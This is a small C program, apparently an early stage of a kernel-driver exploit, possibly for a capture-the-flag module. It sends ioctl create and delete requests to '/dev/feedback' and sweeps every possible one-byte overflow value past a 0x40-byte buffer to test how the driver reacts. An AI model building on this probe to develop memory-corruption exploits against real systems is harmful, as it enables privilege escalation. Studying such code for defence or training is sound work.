#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) exit(1);
    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;
    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    puts("[+] probing create/delete stability for size=0x40 overflow bytes");
    for (int b = 0; b <= 0xff; b++) {
        uint64_t id = 0x100000 + (uint64_t)b;
        if (create_fb(fd, id, 0x40, 0x41, (unsigned char)b) != 0) {
            printf("create fail b=0x%02x errno=%d\n", b, errno);
            continue;
        }
        int rc = del_fb(fd, id);
        if (rc != 0) {
            printf("delete fail b=0x%02x errno=%d\n", b, errno);
        }
        if ((b & 0x1f) == 0) {
            printf(".. b=0x%02x ok\n", b);
        }
    }

    close(fd);
    puts("[+] done");
    return 0;
}
